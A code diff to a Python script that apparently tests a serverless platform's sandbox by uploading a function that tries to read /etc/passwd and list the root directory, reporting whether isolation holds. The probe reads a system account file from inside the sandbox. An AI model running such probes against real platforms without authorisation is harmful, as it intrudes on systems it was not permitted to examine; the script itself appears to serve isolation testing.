@@ -12,27 +12,39 @@ def create_malicious_zip():
     print("🔨 [Attacker] Crafting Malicious Function...")
     code = """
 import os
+import json
+import sys
 
 def handler(event, context):
+    result = {}
     try:
-        # Attempt 1: Read /etc/passwd
+        # 시도 1: /etc/passwd 읽기
         with open('/etc/passwd', 'r') as f:
             data = f.read()
-        return {"status": "BREACHED", "target": "/etc/passwd", "preview": data[:20]}
-    except Exception as e:
+        result = {"status": "BREACHED", "target": "/etc/passwd", "preview": data[:20]}
+    except Exception:
         pass
         
-    try:
-        # Attempt 2: List Root Directory
-        files = os.listdir('/')
-        return {"status": "PARTIAL", "files": files}
-    except Exception as e:
-        return {"status": "SECURE", "reason": str(e)}
+    if not result:
+        try:
+            # 시도 2: 루트 디렉토리 목록 조회
+            files = os.listdir('/')
+            result = {"status": "PARTIAL", "files": files}
+        except Exception as e:
+            result = {"status": "SECURE", "reason": str(e)}
+
+    # 결과를 stdout으로 출력 (서버가 이를 캡처함)
+    print(json.dumps(result))
+    return result
+
+# [핵심 수정] 스크립트 실행 시 핸들러를 강제로 호출
+if __name__ == "__main__":
+    handler(None, None)
 """
     # Create zip in memory
     mem_zip = io.BytesIO()
     with zipfile.ZipFile(mem_zip, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
-        zf.writestr("function.py", code)
+        zf.writestr("main.py", code)
     
     return mem_zip.getvalue()
 
@@ -62,6 +74,7 @@ def run_attack(func_id):
         data = res.json()
         
         print("\n🔍 SECURITY SCAN RESULTS")
+        print(f"DEBUG: Raw Response: {data}") # Debugging line
         print("----------------------------------------------------------------")
         
         status = data.get("result", {}).get("status", "UNKNOWN")
